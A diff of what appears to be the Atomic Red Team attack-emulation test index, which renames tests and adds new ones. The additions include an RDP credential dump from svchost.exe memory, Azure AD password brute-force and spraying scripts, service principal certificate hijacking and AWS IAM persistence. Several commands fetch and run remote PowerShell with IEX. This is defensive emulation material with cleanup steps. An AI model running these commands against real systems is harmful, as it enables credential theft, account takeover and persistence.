@@ -1114,7 +1114,7 @@ credential-access:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
         cleanup_command: 'Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction
           Ignore
@@ -1486,10 +1486,10 @@ credential-access:
       - Windows
       identifier: T1003.006
     atomic_tests:
-    - name: DCSync
+    - name: DCSync (Active Directory)
       auto_generated_guid: 129efd28-8497-4c87-a1b0-73b9a870ca3e
       description: |
-        Attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
+        Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
         Works against a remote Windows Domain Controller using the replication protocol.
         Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
         [Reference](https://adsecurity.org/?p=1729)
@@ -1497,7 +1497,7 @@ credential-access:
       - windows
       input_arguments:
         domain:
-          description: Targeted domain
+          description: Targeted Active Directory domain
           type: string
           default: example.com
         user:
@@ -1965,10 +1965,10 @@ credential-access:
       - Windows
       identifier: T1558.001
     atomic_tests:
-    - name: Crafting golden tickets with mimikatz
+    - name: Crafting Active Directory golden tickets with mimikatz
       auto_generated_guid: 9726592a-dabc-4d4d-81cd-44070008b3af
       description: |
-        Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the domain.
+        Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
         This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
         The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
       supported_platforms:
@@ -1980,7 +1980,7 @@ credential-access:
           type: string
           default: S-1-5-21-DEFAULT
         domain:
-          description: Targeted domain FQDN
+          description: Targeted Active Directory domain FQDN
           type: string
           default: example.com
         account:
@@ -2522,11 +2522,15 @@ credential-access:
         'aureport --tty' or other audit.d reading tools to read the log output, which
         is binary.  Mac OS does not currently contain the pam_tty_audit.so library.
         \n"
-      prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+      dependencies:
+      - description: 'Checking if pam_tty_audit.so is installed
 
 '
-      get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so and
-        recompile, for this test to work"
+        prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+
+'
+        get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so
+          and recompile, for this test to work"
 
 '
       supported_platforms:
@@ -4062,6 +4066,25 @@ credential-access:
           C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore"
         name: powershell
         elevation_required: true
+    - name: Dump svchost.exe to gather RDP credentials
+      auto_generated_guid: d400090a-d8ca-4be0-982e-c70598a23de9
+      description: |
+        The svchost.exe contains the RDP plain-text credentials.
+        Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
+
+        Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
+          if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
+          C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
+        cleanup_command: 'Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: true
   T1110.002:
     technique:
       external_references:
@@ -4334,10 +4357,10 @@ credential-access:
       - Containers
       identifier: T1110.001
     atomic_tests:
-    - name: Brute Force Credentials of all domain users via SMB
+    - name: Brute Force Credentials of all Active Directory domain users via SMB
       auto_generated_guid: '09480053-2f98-4854-be6e-71ae5f672224'
       description: 'Creates username and password files then attempts to brute force
-        on remote host
+        Active Directory accounts on remote host
 
 '
       supported_platforms:
@@ -4358,7 +4381,8 @@ credential-access:
           type: String
           default: "\\\\COMPANYDC1\\IPC$"
         domain:
-          description: Domain name of the target system we will brute force upon
+          description: Active Directory domain name of the target system we will brute
+            force upon
           type: String
           default: YOUR_COMPANY
       executor:
@@ -4369,11 +4393,14 @@ credential-access:
           echo "1q2w3e4r" >> #{input_file_passwords}
           echo "Password!" >> #{input_file_passwords}
           @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
-    - name: Brute Force Credentials of single domain user via LDAP against domain
-        controller (NTLM or Kerberos)
+        cleanup_command: |-
+          del #{input_file_users}
+          del #{input_file_passwords}
+    - name: Brute Force Credentials of single Active Directory domain user via LDAP
+        against domain controller (NTLM or Kerberos)
       auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
-      description: 'Attempt to brute force domain user on a domain controller, via
-        LDAP, with NTLM or Kerberos
+      description: 'Attempt to brute force Active Directory domain user on a domain
+        controller, via LDAP, with NTLM or Kerberos
 
 '
       supported_platforms:
@@ -4388,7 +4415,7 @@ credential-access:
           type: String
           default: Password1`n1q2w3e4r`nPassword!
         domain:
-          description: Domain FQDN
+          description: Active Directory domain FQDN
           type: String
           default: contoso.com
         auth:
@@ -4418,6 +4445,55 @@ credential-access:
               Write-Host " [!] #{user}:${password} are valid credentials!"
             } catch {
               Write-Host $_.Exception.Message
+            }
+          }
+          Write-Host "End of bruteforce"
+    - name: Brute Force Credentials of single Azure AD user
+      auto_generated_guid: 5a51ef57-299e-4d62-8e11-2d440df55e69
+      description: 'Attempt to brute force Azure AD user via AzureAD powershell module.
+
+'
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        username:
+          description: Account to bruteforce. We encourage users running this atomic
+            to add a valid microsoft account domain; for eg "bruce.wayne@<valid_ms_account.com>"
+          type: String
+          default: bruce.wayne@contoso.com
+        passwords:
+          description: List of passwords we will attempt to brute force with
+          type: String
+          default: Password1`n1q2w3e4r`nPassword!
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AzureAD module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AzureAD) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AzureAD -Force
+
+'
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Import-Module -Name AzureAD
+
+          $passwords = "#{passwords}".split("{`n}")
+          foreach($password in $passwords) {
+            $PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force
+            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+            try {
+              Write-Host " [-] Attempting ${password} on account #{username}."
+              Connect-AzureAD -Credential $Credential 2>&1> $null
+              # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+              Write-Host " [!] #{username}:${password} are valid credentials!`r`n"
+              break
+            } catch {
+              Write-Host " [-] #{username}:${password} invalid credentials.`r`n"
             }
           }
           Write-Host "End of bruteforce"
@@ -4619,11 +4695,11 @@ credential-access:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
-    - name: Password spray all domain users with a single password via LDAP against
-        domain controller (NTLM or Kerberos)
+    - name: Password spray all Active Directory domain users with a single password
+        via LDAP against domain controller (NTLM or Kerberos)
       auto_generated_guid: f14d956a-5b6e-4a93-847f-0c415142f07d
       description: |
-        Attempt to brute force all domain user with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos
+        Attempt to brute force all Active Directory domain users with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos
 
         Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)
       supported_platforms:
@@ -4669,6 +4745,66 @@ credential-access:
               Write-Host " [!] ${user}:${password} are valid credentials!"
             } catch {
               Write-Host $_.Exception.Message
+            }
+          }
+          Write-Host "End of password spraying"
+    - name: Password spray all Azure AD users with a single password
+      auto_generated_guid: a8aa2d3e-1c52-4016-bc73-0f8854cfa80a
+      description: |
+        Attempt to brute force all Azure AD users with a single password (called "password spraying") via AzureAD Powershell module.
+        Valid credentials are only needed to fetch the list of Azure AD users.
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        password:
+          description: Single password we will attempt to auth with (if you need several
+            passwords, then it is a bruteforce so see T1110.001)
+          type: String
+          default: P@ssw0rd!
+        valid_username:
+          description: Valid username to retrieve Azure AD users. We encourage users
+            running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>
+          type: String
+          default: bruce.wayne@contoso.com
+        valid_password:
+          description: Valid password to authenticate as valid_username in the <valid_ms_account>
+          type: string
+          default: iamthebatman
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AzureAD module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AzureAD) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AzureAD -Force
+
+'
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Import-Module -Name AzureAD
+          $PWord = ConvertTo-SecureString -String "#{valid_password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{valid_username}", $Pword
+          Connect-AzureAD -Credential $Credential > $null
+
+          ($Users = Get-AzureADUser -All $true) > $null
+          Disconnect-AzureAD > $null
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+
+          $Users | Foreach-Object {
+            $user = $_.UserPrincipalName
+            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$user", $Pword
+            try {
+              Write-Host " [-] Attempting #{password} on account ${user}."
+              Connect-AzureAD -Credential $Credential 2>&1> $null
+              # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+              Write-Host " [!] ${user}:#{password} are valid credentials!`r`n"
+              Disconnect-AzureAD > $null
+            } catch {
+              Write-Host " [-] ${user}:#{password} invalid credentials.`r`n"
             }
           }
           Write-Host "End of password spraying"
@@ -6930,7 +7066,7 @@ collection:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
         cleanup_command: 'Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt"
           -ErrorAction Ignore
@@ -7844,11 +7980,15 @@ collection:
         'aureport --tty' or other audit.d reading tools to read the log output, which
         is binary.  Mac OS does not currently contain the pam_tty_audit.so library.
         \n"
-      prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+      dependencies:
+      - description: 'Checking if pam_tty_audit.so is installed
 
 '
-      get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so and
-        recompile, for this test to work"
+        prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+
+'
+        get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so
+          and recompile, for this test to work"
 
 '
       supported_platforms:
@@ -13448,7 +13588,7 @@ privilege-escalation:
         command: |
           sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}
           sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}
-        cleanup: |
+        cleanup_command: |
           sudo launchctl unload /Library/LaunchDaemons/#{plist_filename}
           sudo rm /Library/LaunchDaemons/#{plist_filename}
   T1053.004:
@@ -15234,7 +15374,7 @@ privilege-escalation:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
@@ -15369,13 +15509,14 @@ privilege-escalation:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
     - name: Remote Process Injection in LSASS via mimikatz
       auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
       description: |
         Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
+        Especially useful against domain controllers in Active Directory environments.
         It must be executed in the context of a user who is privileged on remote `machine`.
 
         The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
@@ -16265,7 +16406,7 @@ privilege-escalation:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -19110,7 +19251,7 @@ defense-evasion:
         command: |
           bitsadmin.exe /create #{bits_job_name}
           bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
           bitsadmin.exe /resume #{bits_job_name}
           timeout 5
           bitsadmin.exe /complete #{bits_job_name}
@@ -20452,7 +20593,7 @@ defense-evasion:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
         name: powershell
         elevation_required: true
@@ -25296,7 +25437,7 @@ defense-evasion:
           $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
           $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
         cleanup_command: 'Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
 
@@ -30941,7 +31082,7 @@ defense-evasion:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
@@ -31076,13 +31217,14 @@ defense-evasion:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
     - name: Remote Process Injection in LSASS via mimikatz
       auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
       description: |
         Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
+        Especially useful against domain controllers in Active Directory environments.
         It must be executed in the context of a user who is privileged on remote `machine`.
 
         The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
@@ -32254,10 +32396,10 @@ defense-evasion:
       x_mitre_version: '2.0'
       identifier: T1207
     atomic_tests:
-    - name: DCShadow - Mimikatz
+    - name: DCShadow (Active Directory)
       auto_generated_guid: 0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6
       description: |
-        Use Mimikatz DCShadow method to simulate behavior of a Domain Controller and edit protected attribute.
+        Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.
 
         [DCShadow](https://www.dcshadow.com/)
         [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
@@ -36754,6 +36896,39 @@ persistence:
 
 '
         name: powershell
+    - name: AWS - Create a group and add a user to that group
+      auto_generated_guid: 8822c3b0-d9f9-4daf-a043-49f110a31122
+      description: 'Adversaries create AWS group, add users to specific to that group
+        to elevate their privilieges to gain more accesss
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        username:
+          description: Name of the AWS group to create
+          type: String
+          default: atomicredteam
+      dependencies:
+      - description: 'Check if the user exists, we can only add a user to a group
+          if the user exists.
+
+'
+        prereq_command: 'aws iam list-users | grep #{username}
+
+'
+        get_prereq_command: 'echo Please run atomic test T1136.003, before running
+          this atomic test
+
+'
+      executor:
+        command: |
+          aws iam create-group --group-name #{username}
+          aws iam add-user-to-group --user-name #{username} --group-name #{username}
+        cleanup_command: |
+          aws iam remove-user-from-group --user-name #{username} --group-name #{username}
+          aws iam delete-group --group-name #{username}
+        name: sh
   T1547.014:
     technique:
       external_references:
@@ -37007,7 +37182,195 @@ persistence:
       x_mitre_platforms:
       - IaaS
       - Azure AD
-    atomic_tests: []
+      identifier: T1098.001
+    atomic_tests:
+    - name: Azure AD Application Hijacking - Service Principal
+      auto_generated_guid: b8e747c3-bdf7-4d71-bce2-f1df2a057406
+      description: |
+        Add a certificate to an Application through its Service Principal.
+        The certificate can then be used to authenticate as the application and benefit from its rights.
+        An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        service_principal_name:
+          description: Name of the targeted service principal
+          type: String
+          default: SuperSP
+        certificate_password:
+          description: Password of the new certificate
+          type: string
+          default: Passw0rd
+        path_to_cert:
+          description: Path of the new certificate, locally stored
+          type: string
+          default: "$env:TEMP"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AzureAD module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AzureAD) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AzureAD -Force
+
+'
+      executor:
+        command: |
+          Import-Module -Name AzureAD
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential
+
+          $sp = Get-AzureADServicePrincipal -Searchstring "#{service_principal_name}"
+          if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
+          # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
+          $certNotAfter = (Get-Date).AddDays(2)
+          $credNotAfter = (Get-Date).AddDays(1)
+          $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
+          $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
+          Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{service_principal_name}.pfx" -Password $pwd
+
+          $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{service_principal_name}.pfx", $pwd)
+          $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
+
+          New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
+
+          Start-Sleep -s 30
+          $tenant=Get-AzureADTenantDetail
+          $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb
+          Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
+          Write-Host "End of Hijacking"
+        cleanup_command: "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString
+          -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName
+          System.Management.Automation.PSCredential -ArgumentList \"#{username}\",
+          $Pword\nConnect-AzureAD -Credential $Credential\n\n$sp = Get-AzureADServicePrincipal
+          -Searchstring \"#{service_principal_name}\"\n$credz = Get-AzureADServicePrincipalKeyCredential
+          -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier)
+          -eq \"AtomicTest\") {\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId
+          $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My
+          | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\nrm \"#{path_to_cert}\\#{service_principal_name}.pfx\"\n"
+        name: powershell
+        elevation_required: false
+    - name: Azure AD Application Hijacking - App Registration
+      auto_generated_guid: a12b5531-acab-4618-a470-0dafb294a87a
+      description: |
+        Add a certificate to an Application through its App Registration.
+        The certificate can then be used to authenticate as the application and benefit from its rights.
+        An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        application_name:
+          description: Name of the targeted application
+          type: String
+          default: SuperApp
+        certificate_password:
+          description: Password of the new certificate
+          type: string
+          default: Passw0rd
+        path_to_cert:
+          description: Path of the new certificate, locally stored
+          type: string
+          default: "$env:TEMP"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AzureAD module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AzureAD) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AzureAD -Force
+
+'
+      executor:
+        command: |
+          Import-Module -Name AzureAD
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential
+
+          $app = Get-AzureADApplication -Searchstring "#{application_name}"
+          if ($app -eq $null) { Write-Warning "Application not found"; exit }
+          $certNotAfter = (Get-Date).AddDays(2)
+          $credNotAfter = (Get-Date).AddDays(1)
+          $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
+          $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
+          Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{application_name}.pfx" -Password $pwd
+
+          $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{application_name}.pfx", $pwd)
+          $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
+
+          New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
+
+          Start-Sleep -s 30
+          $tenant=Get-AzureADTenantDetail
+          $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb
+          Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
+          Write-Host "End of Hijacking"
+        cleanup_command: "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString
+          -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName
+          System.Management.Automation.PSCredential -ArgumentList \"#{username}\",
+          $Pword\nConnect-AzureAD -Credential $Credential\n\n$app = Get-AzureADApplication
+          -Searchstring \"#{application_name}\"\n$credz = Get-AzureADApplicationKeyCredential
+          -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier)
+          -eq \"AtomicTest\") {\n    Remove-AzureADApplicationKeyCredential -ObjectId
+          $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My
+          | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\nrm \"#{path_to_cert}\\#{application_name}.pfx\"\n"
+        name: powershell
+        elevation_required: false
+    - name: AWS - Create Access Key and Secret Key
+      auto_generated_guid: 8822c3b0-d9f9-4daf-a043-491160a31122
+      description: 'Adversaries create their own new access and secret keys to programatically
+        interact with AWS environment, which is already compromised
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        username:
+          description: Create new AWS access and secret keys for the user
+          type: String
+          default: atomicredteam
+      dependencies:
+      - description: 'Check if the user exists.
+
+'
+        prereq_command: 'aws iam list-users | grep #{username}
+
+'
+        get_prereq_command: 'echo Please run atomic test T1136.003, before running
+          this atomic
+
+'
+      executor:
+        command: |
+          aws iam create-access-key --user-name #{username} > $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds
+          cd $PathToAtomicsFolder/T1098.001/bin/
+          ./aws_secret.sh
+        cleanup_command: |
+          access_key=`cat $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds| jq -r '.AccessKey.AccessKeyId'`
+          aws iam delete-access-key --access-key-id $access_key --user-name #{username}
+          rm $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds
+        name: sh
   T1546.009:
     technique:
       external_references:
@@ -37808,7 +38171,7 @@ persistence:
         command: |
           bitsadmin.exe /create #{bits_job_name}
           bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
           bitsadmin.exe /resume #{bits_job_name}
           timeout 5
           bitsadmin.exe /complete #{bits_job_name}
@@ -38578,7 +38941,43 @@ persistence:
       - Office 365
       - IaaS
       - Google Workspace
-    atomic_tests: []
+      identifier: T1136.003
+    atomic_tests:
+    - name: AWS - Create a new IAM user
+      auto_generated_guid: 8d1c2368-b503-40c9-9057-8e42f21c58ad
+      description: 'Creates a new IAM user in AWS. Upon successful creation, a new
+        user will be created. Adversaries create new IAM users so that their malicious
+        activity do not interupt the normal functions of the compromised users and
+        can remain undetected for a long time
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
